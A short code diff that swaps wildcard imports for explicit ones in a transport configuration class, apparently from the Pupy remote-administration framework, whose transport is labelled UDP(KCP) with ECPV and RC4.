@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
-from network.transports import *
-from network.lib import *
+from network.transports import Transport, LAUNCHER_TYPE_BIND
+from network.lib import PupyUDPServer, PupyUDPClient, PupyUDPSocketStream
+from network.lib import EC4TransportClient, EC4TransportServer
 
 class TransportConf(Transport):
     info = "UDP(KCP) + ECPV + RC4"
